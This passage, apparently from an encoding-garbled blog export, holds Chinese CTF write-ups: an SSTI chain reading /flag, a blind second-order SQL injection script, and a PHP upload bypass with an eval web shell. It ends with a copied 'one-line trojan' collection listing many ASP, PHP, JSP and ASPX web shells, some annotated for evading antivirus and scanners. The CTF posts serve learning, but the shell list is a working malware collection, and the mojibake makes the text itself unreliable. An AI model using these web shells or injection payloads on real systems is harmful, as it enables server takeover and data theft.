ä¸­ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰ä¸€ä¸ªå…¨å±€å‘½åç©ºé—´ï¼Œç”¨äºå­˜å‚¨è¯¥æ¨¡å—ä¸­å®šä¹‰çš„å…¨å±€å˜é‡å’Œå‡½æ•°ã€‚å½“ä¸€ä¸ªç±»è¢«å®šä¹‰åœ¨ä¸€ä¸ªæ¨¡å—ä¸­æ—¶ï¼Œå®ƒä¹Ÿå¯ä»¥è®¿é—®è¯¥æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ä¸­çš„å˜é‡å’Œå‡½æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—® globals å±æ€§æ¥è·å¾—è¯¥æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡å’Œå‡½æ•°ã€‚è¿™äº›å¯¹è±¡å¯ä»¥è¢«è¯»å–å’Œä¿®æ”¹ï¼Œæ¥ä¸‹æ¥ä»‹ç» builtins æ˜¯ Python ä¸­ä¸€ä¸ªå†…ç½®çš„æ¨¡å—å¯¹è±¡ï¼Œä»–åœ¨pythonè§£é‡Šå™¨å¯åŠ¨æ—¶ï¼Œ builtins å¯¹è±¡å°±ä¼šè¢«åˆ›å»ºå¹¶ä¸”è‡ªåŠ¨æ·»åŠ åˆ°å…¨å±€å‘½åç©ºé—´ä¸­ï¼Œå› æ­¤ builtins å¯ä»¥åœ¨è®¤å¯åœ°æ–¹è®¿é—®ï¼Œ builtins æ¨¡å—åŒ…å«äº†å¾ˆå¤šå†…ç½®å‡½æ•°ï¼Œå…¶ä¸­å°±åŒ…æ‹¬æˆ‘ä»¬è¿™æè¦ç”¨çš„openï¼ˆï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡__globals__æ¥è®¿é—® builtins æ¨¡å—ä¸­çš„openå‡½æ•°æ¥è¾¾åˆ°è¯»å–flagæ–‡ä»¶çš„ç›®çš„ï¼Œ if 'objects' not in res_: print(i, res_) æ¥ä¸‹æ¥ç»™è„šæœ¬åŠ ä¸Šè¿™ä¸¤è¡Œï¼Œå°±ä¼šè¾“å‡ºé‡å†™initçš„å­ç±»å¹¶ä¸”åŠ ä¸Šåºå·ï¼Œæ–¹ä¾¿åç»­æ‰‹åŠ¨æ“ä½œï¼Œå½“ç„¶è„šæœ¬ä¹Ÿå¯ä»¥ okè¿™é‡Œçœ‹åˆ°åºå·ä¹‹åå¼€å§‹æ³¨å…¥ï¼Œè¿™é‡Œé€‰æ‹©75ï¼Œå½“ç„¶æ‰€æœ‰è¾“å‡ºçš„åºå·éƒ½å¯ä»¥ç”¨ ï¸·ï¸·().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__ï¸¸ï¸¸ ä¼šçœ‹åˆ°å‡ºç°äº†å¾ˆå¤šå†…ç½®å‡½æ•°ï¼Œè¿™é‡Œå°±æœ‰æˆ‘ä»¬éœ€è¦ç”¨çš„openï¼ˆï¼‰ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨openè®¿é—®flagæ–‡ä»¶è¯»å–å°±è¡Œäº† ï¸·ï¸·().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[ï¼‡openï¼‡](ï¼‡/flagï¼‡).read()ï¸¸ï¸¸ è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œ[]å’Œ()é‡Œé¢çš„ç¬¦å·æ˜¯ï¼‡è€Œä¸æ˜¯å•å¼•å·ï¼ˆè¢«è¿‡æ»¤ï¼‰ï¼Œä¹‹åå°±è¯»åˆ°flagäº† å‚è€ƒæ–‡ç« ï¼š æ·±å…¥ç†è§£SSTI. æ”»é˜²ä¸–ç•Œeasy_web é™„pythonè„šæœ¬ æ”»é˜²ä¸–ç•Œâ€“easy_web æ”»é˜²ä¸–ç•Œeasy_web","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-unfinish","path":"/2023/08/24/unfinish/","content":"é¢˜ç›®æè¿°ï¼š SQL é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢å‘ç°æ²¡å•¥ä¿¡æ¯ï¼Œé‚®ç®±ä¹Ÿå¿…é¡»ç¬¦åˆæ­£å¸¸æ ¼å¼ï¼Œæºä»£ç ä¹Ÿæ²¡ç”¨ï¼Œå› æ­¤å°±ç”¨dirsearchæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸ªregister.phpé¡µé¢ï¼Œæ­¤åˆ»æˆ‘å°±æƒ³åˆ°å¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼Œæ¯•ç«Ÿå°±è¿™ä¿©é¡µé¢ã€‚å…¶æ¬¡ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥ç”¨awvsæ‰«ä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥æ‰«å‡ºæ¥ ç¡®å®šæ˜¯æ³¨å…¥åï¼Œå°±æ˜¯å¯»æ‰¾æ³¨å…¥ç‚¹äº†ï¼Œè¿™é‡Œè¾“å…¥æ­£å¸¸çš„æ³¨å†Œå†…å®¹æŠ“åŒ…çœ‹ä¸€ä¸‹ ç»“åˆä¸‹å›¾çš„é¡µé¢å‘ç°ä¼šå›æ˜¾ç”¨æˆ·åï¼Œé‚£åŸºæœ¬æ³¨å…¥ç‚¹å°±åœ¨ç”¨æˆ·åäº† ç”¨æˆ·åæ³¨å†Œæ—¶åŠ ä¸ªå•å¼•å·æ³¨å†Œå¤±è´¥ï¼ŒåŒå¼•å·æ³¨å†ŒæˆåŠŸï¼Œè¯´æ˜å¯èƒ½ä¸ºå•å¼•å·é—­åˆÂ·ï¼Œ éšåå°±æ˜¯å¯¹ç”¨æˆ·åè¿‡æ»¤å­—ç¬¦çš„fuzzäº† å¯ä»¥çœ‹åˆ°è¿™æœ‰è¿™å››ä¸ªæ²¡æœ‰è¿‡æ»¤ï¼Œæ¥ç€å°±å¼€å§‹å€Ÿé‰´wpäº† çœ‹äº†çœ‹å¤§ä½¬çš„wpï¼Œç¿»è¯‘ä¸€ä¸‹ï¼Œå°±æ˜¯é€šè¿‡ä½¿ç”¨0â€™+1+'0ä½œä¸ºç”¨æˆ·åï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™ï¼ŒçŒœæƒ³ä½¿ç”¨sqlè¯­å¥æ’å…¥åˆ°è¡¨ä¸­ï¼Œå¦‚ï¼š insert into tables values('$email','$username','$password') åœ¨æ’å…¥ä¸­å°†0â€™+1+â€˜0æ’å…¥ï¼Œå–çš„æ—¶å€™ï¼ŒMySQLè¯­è¨€çš„ä¸€ç§ç‰¹æ€§ï¼Œå°±æ˜¯+åœ¨MySQLä¸­æ˜¯ä½œä¸ºè¿ç®—ç¬¦çš„ï¼Œå¼•ç”¨ä¸€å¹…å›¾ï¼š å¦‚æœåŠ å·è¿ç®—ä¸­æœ‰å­—ç¬¦ï¼Œé‚£ä¹ˆmysqlå°±ä¼šæŠŠå­—ç¬¦è½¬å˜ä¸ºæ•°å­—åœ¨ç›¸åŠ ï¼Œæ¯”å¦‚select â€˜1â€™+â€˜1aâ€™;ç»“æœä¸º2ï¼Œè½¬æ¢è¿‡ç¨‹è·Ÿphpç±»ä¼¼ã€‚ ä¸‹é¢æ˜¯å‡ ä¸ªä¾‹å­ï¼š mysql&gt; select '1'+'1a'; +----------+ | '1'+'1a' | +----------+ | 2 | +----------+ 1 row in set, 1 warning (0.00 sec) mysql&gt; select '0'+database(); +----------------+ | '0'+database() | +----------------+ | 0 | +----------------+ 1 row in set (0.00 sec) å¯ä»¥ç”¨æˆªå–çš„æ–¹æ³•ï¼Œæˆªå–å¤„æ¯ä¸€ä½ï¼Œç„¶åasciiç¼–ç ã€‚ mysql&gt; select '0'+ascii(substr(database(),1,1)); +-----------------------------------+ | '0'+ascii(substr(database(),1,1)) | +-----------------------------------+ | 100 | +-----------------------------------+ 1 row in set (0.00 sec) mysql&gt; select '0'+ascii(substr(database(),2,1)); +-----------------------------------+ | '0'+ascii(substr(database(),2,1)) | +-----------------------------------+ | 118 | +-----------------------------------+ 1 row in set (0.00 sec) æˆåŠŸæˆªå–ï¼Œä½†æ˜¯é€—å·è¢«è¿‡æ»¤ï¼Œè¯¥å’‹åŠã€‚ä½¿ç”¨from...for...ä»£æ›¿ã€‚ mysql&gt; select '0'+ascii(substr(database() from 1 for 1)); +--------------------------------------------+ | '0'+ascii(substr(database() from 1 for 1)) | +--------------------------------------------+ | 100 | +--------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select '0'+ascii(substr((database()) from 2 for 1)); +----------------------------------------------+ | '0'+ascii(substr((database()) from 2 for 1)) | +----------------------------------------------+ | 118 | +----------------------------------------------+ 1 row in set (0.00 sec) è¿˜æœ‰å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶è½¬æ¢åè¿ç®— æœ‰ç–‘é—®ï¼Œä¸ºå•¥ä¸ç”¨äºŒè¿›åˆ¶æˆ–è€…å…«è¿›åˆ¶ã€‚ç”¨ä¾‹å­æ¥è¯´æ˜ï¼š mysql&gt; select bin('dvwa'); +-------------+ | bin('dvwa') | +-------------+ | 0 | +-------------+ 1 row in set (0.00 sec) mysql&gt; select oct('dvwa'); +-------------+ | oct('dvwa') | +-------------+ | 0 | +-------------+ 1 row in set (0.00 sec) mysql&gt; select hex('dvwa'); +-------------+ | hex('dvwa') | +-------------+ | 64767761 | +-------------+ 1 row in set (0.00 sec) å¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰åå…­è¿›åˆ¶æˆåŠŸè½¬æ¢ã€‚ ä½†æ˜¯åˆå‡ºæ¥ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœåå…­è¿›åˆ¶è½¬æ¢åçš„å­—ç¬¦ä¸²æœ‰å­—æ¯çš„è¯ï¼Œè½¬åŒ–ä¸ºæ•°å­—åç›¸åŠ å°±ä¼šä¸¢å¤±å­—ç¬¦ã€‚ åˆä½†æ˜¯å½“è¿™ä¸ªé•¿å­—ç¬¦ä¸²è½¬æˆæ•°å­—å‹æ•°æ®çš„æ—¶å€™ä¼šå˜æˆç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šä¸¢å¤±æ•°æ®ç²¾åº¦ã€‚ è¿™é‡Œè¿˜å¯ä»¥ä½¿ç”¨åˆ†æ®µè¯»æ³•ã€‚ mysql&gt; select substr(hex(hex('dvwa{}')) from 1 for 10)+'0'; +----------------------------------------------+ | substr(hex(hex('dvwa{}')) from 1 for 10)+'0' | +----------------------------------------------+ | 3634373637 | +----------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select substr(hex(hex('dvwa{}')) from 11 for 10)+'0'; +-----------------------------------------------+ | substr(hex(hex('dvwa{}')) from 11 for 10)+'0' | +-----------------------------------------------+ | 3736313742 | +-----------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select substr(hex(hex('dvwa{}')) from 21 for 10)+'0'; +-----------------------------------------------+ | substr(hex(hex('dvwa{}')) from 21 for 10)+'0' | +-----------------------------------------------+ | 3744 | +-----------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select unhex(unhex(363437363737363137423744)); +----------------------------------------+ | unhex(unhex(363437363737363137423744)) | +----------------------------------------+ | dvwa{} | +----------------------------------------+ 1 row in set (0.11 sec) æŠ„å¤§ä½¬çš„è„šæœ¬ import requests #å¯¼å…¥ requests æ¨¡å—ï¼Œç”¨äºè¿›è¡Œ HTTP è¯·æ±‚ã€‚ import re\t# å¯¼å…¥ re æ¨¡å—ï¼Œç”¨äºä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œå­—ç¬¦ä¸²åŒ¹é…ã€‚ register_url = 'http://61.147.171.105:49466/register.php' login_url = 'http://61.147.171.105:49466/login.php' for i in range(1, 100): register_data = {# æ„å»ºæ³¨å†Œçš„ç›¸å…³æ•°æ® 'email': '111@123.com%d' % i, 'username': \"0' + ascii(substr((select * from flag) from %d for 1)) + '0\" % i, 'password': 'admin' } res = requests.post(url=register_url, data=register_data)#requests.post() å‘é€æ³¨å†Œè¯·æ±‚ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨resä¸­ã€‚ login_data = { 'email': '111@123.com%d' % i, 'password': 'admin' } res_ = requests.post(url=login_url, data=login_data)#requests.post() å‘é€ç™»å½•è¯·æ±‚ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨ res_ ä¸­ã€‚ # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢ res_.text ä¸­çš„ &lt;span class=\"user-name\"&gt;æ•°å­—&lt;/span&gt; çš„æ¨¡å¼ï¼Œæå–å…¶ä¸­çš„æ•°å­—éƒ¨åˆ†ã€‚è¿™ä¸ªæ•°å­—å¯èƒ½æ˜¯ä»æ•°æ®åº“ä¸­æå–çš„ä¿¡æ¯çš„ä¸€éƒ¨åˆ†ã€‚ code = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;', res_.text) print(chr(int(code.group(1))), end='') å¯¹ä»£ç ä¸­çš„groupçš„ç ”ç©¶ï¼š æ­£åˆ™ import re a = \"123abc456\" print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(0) #123abc456,è¿”å›æ•´ä½“ print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(1) #123 print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(2) #abc print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(3) #456 ç©¶å…¶å›  1. æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ä¸‰ç»„æ‹¬å·æŠŠåŒ¹é…ç»“æœåˆ†æˆä¸‰ç»„ - group() åŒgroupï¼ˆ0ï¼‰å°±æ˜¯åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼æ•´ä½“ç»“æœ - group(1) åˆ—å‡ºç¬¬ä¸€ä¸ªæ‹¬å·åŒ¹é…éƒ¨åˆ†ï¼Œgroup(2) åˆ—å‡ºç¬¬äºŒä¸ªæ‹¬å·åŒ¹é…éƒ¨åˆ†ï¼Œgroup(3) åˆ—å‡ºç¬¬ä¸‰ä¸ªæ‹¬å·åŒ¹é…éƒ¨åˆ†ã€‚ 2. æ²¡æœ‰åŒ¹é…æˆåŠŸçš„ï¼Œre.searchï¼ˆï¼‰è¿”å›None 3. å½“ç„¶éƒ‘åˆ™è¡¨è¾¾å¼ä¸­æ²¡æœ‰æ‹¬å·ï¼Œgroup(1)è‚¯å®šä¸å¯¹äº† *è¡¨ç¤º0æ¬¡æˆ–å¤šæ¬¡ \\rè¡¨ç¤ºåŒ¹é…åŸç”Ÿå­—ç¬¦ä¸²ï¼Œå¦‚\\å°±ä»…è¡¨ç¤º\\ï¼Œä½†æ˜¯*å’Œ?ä¹‹ç±»å°±è¦åŠ \\æ‰èƒ½è¡¨ç¤ºå­—ç¬¦æœ¬èº« å‚è€ƒæ–‡ç« ï¼š xctfæ”»é˜²ä¸–ç•Œ Webé«˜æ‰‹è¿›é˜¶åŒº unfinish æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒºunfinishè¯¦è§£","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-ics-07","path":"/2023/08/24/ics-07/","content":"é¢˜ç›®æè¿°ï¼š å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿé¡¹ç›®ç®¡ç†é¡µé¢è§£ææ¼æ´ é¢˜ç›®è§£é¢˜ï¼š ç†Ÿæ‚‰çš„é¡µé¢ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç‚¹å‡»æµ‹è¯•ï¼Œå‘ç°åªæœ‰é¡¹ç›®ç®¡ç†å¯ä»¥ç‚¹å‡» é¡µé¢å¦‚å›¾æ‰€ç¤ºï¼Œè¿™é‡Œå·¦ä¸‹è§’æœ‰ä¸ªview-sourceï¼Œæˆ‘ä»¬å®¡ä¸€ä¸‹æºç  &lt;?php session_start();//åˆ›å»ºæ–°ä¼šè¯ï¼Œæˆ–é‡ç”¨ç°æœ‰ä¼šè¯ï¼ˆcookieæäº¤ä¼šè¯idæ—¶ï¼‰ if (!isset($_GET[page])) {//æ£€æŸ¥æ˜¯å¦è¯·æ±‚æ­¤é¡µé¢ show_source(__FILE__);//è‹¥å­˜åœ¨è¯·æ±‚ï¼Œè¯­æ³•é«˜äº®æœ¬é¡µé¢ï¼ˆshow_sourceä½œç”¨ç­‰åŒäºhighlight_fileï¼‰ die(); } if (isset($_GET[page]) &amp;&amp; $_GET[page] != 'index.php') {//å¦‚æœè¯·æ±‚é¡µé¢ï¼Œä¸”è¯·æ±‚é“¾æ¥ä¸ä¸ºindex.php include('flag.php');//è§£ææ­¤æ–‡ä»¶flag.php }else { header('Location: ?page=flag.php');//é‡å®šå‘åˆ°flag.php } ?&gt; &lt;form action=\"#\" method=\"get\"&gt; page : &lt;input type=\"text\" name=\"page\" value=\"\"&gt; id : &lt;input type=\"text\" name=\"id\" value=\"\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;br /&gt; &lt;a href=\"index.phps\"&gt;view-source&lt;/a&gt; &lt;?php if ($_SESSION['admin']) {//å¦‚æœä¼šè¯çš„å˜é‡æ˜¯admin $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file;//æ–‡ä»¶å­˜å‚¨äº backup/ //åŒ¹é…æ–‡ä»¶åç§°ï¼Œæ˜¯å¦å­˜åœ¨php3 php4 php5 php7ã€phtmlã€pht? if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename)){ die(\"Bad file extension\"); }else{ chdir('uploaded');//å°†å½“å‰ç›®å½•æ”¹ä¸ºuploadedï¼Œæ›´æ”¹æ–‡ä»¶å­˜å‚¨ä½ç½®ä¸º/uploaded/backup $f = fopen($filename, 'w');//ä»¥å†™å…¥æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œå†…å®¹è¾“å‡ºè‡³$f fwrite($f, $con); //å°†$conçš„å†…å®¹å†™å…¥$f fclose($f); } } ?&gt; &lt;?php//å¦‚æœ idä¸ä¸ºç©º ä¸” idçš„æµ®ç‚¹å€¼ä¸ä¸º1 ä¸”idçš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸º9 if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') { include 'config.php'; $id = mysql_real_escape_string($_GET[id]);//ä»¥è½¬ä¹‰å­—ç¬¦çš„æ–¹å¼è¿æ¥å½“å‰çš„idï¼Œä¼ é€mysqlæŸ¥è¯¢ $sql=\"select * from cetc007.user where id='$id'\";//ä»æ•°æ®åº“é‡ŒæŸ¥è¯¢ç›¸åº”çš„id $result = mysql_query($sql); $result = mysql_fetch_object($result);//å–å‡ºæŸ¥è¯¢ç»“æœ } else { $result = False; die(); } if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\"); if($result){ echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True;//éœ€è¦æ»¡è¶³idæŸ¥è¯¢çš„åç§°ä¸ºadmin } ?&gt; ç”±$_SESSION[â€˜adminâ€™] = True;å¯çŸ¥ï¼Œåªæœ‰æŸ¥è¯¢idæ—¶å¯¹åº”æœ‰ç»“æœï¼Œé‚£å°±ä¼šè®¾ç½®adminçš„sessionå¯¹è¯ï¼Œè¿™æ˜¯æˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ çš„çªç ´ç‚¹ï¼Œé‚£ä¸€èˆ¬æ¥è¯´idåº”è¯¥å°±æ˜¯1ï¼Œæ­¤å¤„ä½ ç»“åˆä»£ç floatval($_GET[id]) !== '1'ä¹Ÿèƒ½çŸ¥é“ï¼Œæ—¢ç„¶å¯¹1æœ‰æ‰€é™åˆ¶ï¼Œé‚£æˆ‘ä»¬åº”è¯¥å°±æ˜¯è¦æŸ¥è¯¢id=1çš„å†…å®¹ floatval â€” è·å–å˜é‡çš„æµ®ç‚¹å€¼ float floatval( mixed $var) è¿”å›å˜é‡ var çš„ float æ•°å€¼ã€‚ var å¯ä»¥æ˜¯ä»»ä½•æ ‡é‡ç±»å‹ã€‚ä½ ä¸èƒ½å°† floatval() ç”¨äºæ•°ç»„æˆ–å¯¹è±¡ã€‚ &lt;?php $var = '122.34343The'; $float_value_of_var = floatval ($var); print $float_value_of_var; // æ‰“å°å‡º 122.34343 ?&gt; å› æ­¤å¯ä»¥å°†idèµ‹å€¼ä¸º1a9 é¡µé¢æœ‰æ‰€å›æ˜¾ï¼Œæ­¤åˆ»æˆ‘ä»¬ä¾¿å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ æ—¶å…ˆæ¥çœ‹çœ‹å¦‚ä½•ç»•è¿‡æ­£åˆ™ï¼Œç»“åˆé¢˜ç›®ä¿¡æ¯ï¼Œè¿™é‡Œè¯´æ˜¯æœ‰æ–‡ä»¶è§£ææ¼æ´ï¼Œé‚£æˆ‘ä»¬åº”å½“æ‰¾ä¸€ä¸‹è¯¥é¡¹ç›®æ˜¯ç”±å“ªä¸ªä¸­é—´ä»¶å†™çš„ è¿™å°±å¥½åŠäº†ã€‚ Apacheè§£ææ¼æ´ åŸç†ï¼š Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æï¼Œå°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚test.php.a.bçš„â€œ.aâ€å’Œâ€œ.bâ€è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸èƒ½è¯†åˆ«è§£æï¼Œapacheå°±ä¼šæŠŠtest.php.a.bè§£ææˆtest.phpã€‚ ä¸Šä¼ æˆåŠŸä»¥åï¼Œé¡µé¢å¹¶ä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œéœ€è¦è¾“å…¥$conçš„ä¸Šä¼ ç½‘å€æŸ¥çœ‹è‡ªå·±çš„æ–‡ä»¶ ä½†ä¼¼ä¹è¿™é‡Œå¹¶æ²¡æœ‰è¢«å½“åšphpè§£æï¼Œèšå‰‘è¿æ¥ä¸ä¸Šå»ï¼Œçœ‹äº†wpå‘ç°payloadå¦‚ä¸‹ con=&lt;?php @eval($_POST[1]);?&gt;&amp;file=shell.php/. è¿™å›æˆåŠŸè§£æä¸ºphpï¼Œèšå‰‘ä¹ŸæˆåŠŸè¿æ¥ æ‹¿åˆ°flag æ€»ç»“ phpçš„è§£é‡Šå™¨å¯ä»¥è§£æï¼šphpã€php3ã€php4ã€php5ã€php7ã€phtmlã€phtã€phsã€shtmlã€pwmlï¼Œä¸è¿‡æœ¬é¢˜éƒ½å¯¹æ­¤è¿‡æ»¤äº†ã€‚ ä¹Ÿæœ‰å¤§ä½¬æ ¹æ®apache2.xçš„è§£ææ¼æ´ï¼Œè¡¥å……äº†ä¸å¯è¯†åˆ«çš„æ–‡ä»¶æ ¼å¼~ä¾‹å¦‚1.php.1ï¼ˆæœ‰å¤§ä½¬ä»¥æˆªæ–­å½¢å¼è¾“å…¥ï¼Œ1.php/.ï¼Œä¸Šä¼ åæ˜¾ç¤ºä¸º1.phpï¼‰ ç»•è¿‡æ–¹å¼`../filename.php/.`æˆ–è€…`filename.php/.` ç»•è¿‡åŸç†:æ–‡ä»¶åä¸­ä¸å…è®¸å¸¦æœ‰/ å› ä¸º/è¡¨ç¤ºç›®å½•çš„åˆ†å‰²ç¬¦ åœ¨phpä¸­ï¼Œå¦‚æœä¿å­˜çš„æ–‡ä»¶ä¸­å«æœ‰/ ä¼šè‡ªåŠ¨çœç•¥/åé¢çš„å†…å®¹ï¼Œ/åé¢çš„.æ˜¯ä¸ºäº†è¾¾åˆ°åŒ¹é…æœ€åä¸€ä¸ª.çš„æ•ˆæœ å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ wpå‚è€ƒä¸‰","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"ä¸€å¥è¯æœ¨é©¬å¤§å…¨","path":"/2023/08/23/web-ji-qiao-zong-jie/","content":"è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼šhttps://blog.csdn.net/l1028386804/article/details/84206143 &lt;%eval request(\"c\")%&gt; &lt;%execute request(\"c\")%&gt; &lt;%execute(request(\"c\"))%&gt; &lt;%ExecuteGlobal request(\"sb\")%&gt; %&gt;&lt;%Eval(Request(chr(35)))%&gt;&lt;% &lt;%if request (\"c\")&lt;&gt;\"\"then session(\"c\")=request(\"c\"):end if:if session(\"c\")&lt;&gt;\"\" then execute session(\"c\")%&gt; &lt;%eval(Request.Item[\"c\"],\"unsafe\");%&gt; 'å¤‡ä»½ä¸“ç”¨ &lt;%eval(request(\"c\")):response.end%&gt; 'æ— é˜²ä¸‹è½½è¡¨,æœ‰é˜²ä¸‹è½½è¡¨çªç ´ä¸“ç”¨ä¸€å¥è¯ &lt;%execute request(\"c\")%&gt;&lt;%&lt;%loop&lt;%:%&gt; &lt;%&lt;%loop&lt;%:%&gt;&lt;%execute request(\"c\")%&gt; &lt;%execute request(\"c\")&lt;%loop&lt;%:%&gt; 'é˜²æ€é˜²æ‰«ä¸“ç”¨ &lt;%if Request(\"c\")&lt;&gt;\"\" ThenExecuteGlobal(Request(\"c\"))%&gt; 'ä¸ç”¨\"&lt;,&gt;\" &lt;script language=VBScript runat=server&gt;execute request(\"c\")&lt;/script&gt; &lt;% @Language=\"JavaScript\" CodePage=\"65001\"var lcx={'åå­—':Request.form('#'),'æ€§åˆ«':eval,'å¹´é¾„':'18','æ˜µç§°':'è¯·å«æˆ‘ä¸€å£°è€å¤§'};lcx.æ€§åˆ«((lcx. åå­—)+'') %&gt; &lt;script language=vbs runat=server&gt;eval(request(\"c\"))&lt;/script&gt; &lt;script language=vbs runat=server&gt;eval_r(request(\"c\"))&lt;/script&gt; 'ä¸ç”¨åŒå¼•å· &lt;%eval request(chr(35))%&gt; 'å¯ä»¥èº²è¿‡é›·å®¢å›¾ &lt;%set ms = server.CreateObject(\"MSScriptControl.ScriptControl.1\") ms.Language=\"VBScript\" ms.AddObject\"response\",response ms.AddObject \"request\",request ms.ExecuteStatement(\"ev\"&amp;\"al(request(\"\"c\"\"))\")%&gt; &lt;%dy=request(\"dy\")%&gt;&lt;%Eval(dy)%&gt; 'å®¹é”™ä»£ç  if Request(\"sb\")&lt;&gt;\"\" then ExecuteGlobal request(\"sb\") end if PHPä¸€å¥è¯ &lt;?php eval($_POST1);?&gt; &lt;?php if(isset($_POST['c'])){eval($_POST['c']);}?&gt; &lt;?php system($_REQUEST1);?&gt; &lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; &lt;?php eval_r($_POST1)?&gt; &lt;?php @eval_r($_POST1)?&gt;//å®¹é”™ä»£ç  &lt;?php assert($_POST1);?&gt;//ä½¿ç”¨Lankerä¸€å¥è¯å®¢æˆ·ç«¯çš„ä¸“å®¶æ¨¡å¼æ‰§è¡Œç›¸å…³çš„PHPè¯­å¥ &lt;?$_POST['c']($_POST['cc']);?&gt; &lt;?$_POST['c']($_POST['cc'],$_POST['cc'])?&gt; &lt;?php @preg_replace(\"/[email]/e\",$_POST['h'],\"error\");?&gt;/*ä½¿ç”¨è¿™ä¸ªå,ä½¿ç”¨èœåˆ€ä¸€å¥è¯å®¢æˆ·ç«¯åœ¨é…ç½®è¿æ¥çš„æ—¶å€™åœ¨\"é…ç½®\"ä¸€æ è¾“å…¥*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; &lt;?php echo `$_GET['r']` ?&gt; //ç»•è¿‡&lt;?é™åˆ¶çš„ä¸€å¥è¯ &lt;script language=\"php\"&gt;@eval($_POST[sb])&lt;/script&gt; //ç»•è¿‡&lt;?php ?&gt;é™åˆ¶çš„ä¸€å¥è¯ &lt;?=eval($_POST['cmd']); JSPä¸€å¥è¯ &lt;%if(request.getParameter(\"f\")!=null)(newjava.io.FileOutputStream (application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write (request.getParameter(\"t\").getBytes());%&gt; æäº¤å®¢æˆ·ç«¯ &lt;form action=\"\" method=\"post\"&gt;&lt;textareaname=\"t\"&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=\"submit\"value=\"æäº¤\"&gt;&lt;/form&gt; ASPXä¸€å¥è¯ &lt;script language=\"C#\"runat=\"server\"&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(\"add6bb58e139be10\")&lt;/script&gt; æ™®é€šçš„phpä¸€å¥è¯ï¼š&lt;?php @eval($_POST['r00ts']);?&gt; æ™®é€šçš„aspä¸€å¥è¯ï¼š&lt;%eval(Request.Item[\"r00ts\"],â€unsafeâ€);%&gt; aspxçªç ´ä¸€æµçš„ï¼š dim da set fso=server.createobject(\"scripting.filesystemobject\") path=request(\"path\") if path&lt;&gt;\"\" then data=request(\"da\") set da=fso.createtextfile(path,true) da.write data if err=0 then Response.Write \"yes\" else Response.Write \"no\" end if err.clear end if set da=nothing set fos=nothing Response.Write \"&lt;form action=\" method=post&gt;\" Response.Write \"&lt;input type=text name=path&gt;\" Response.Write \"&lt;br&gt;\" Response.Write \"å½“å‰æ–‡ä»¶è·¯å¾„:\"&amp;server.mappath(request.servervariables(\"script_name\")) Response.Write \"&lt;br&gt;\" 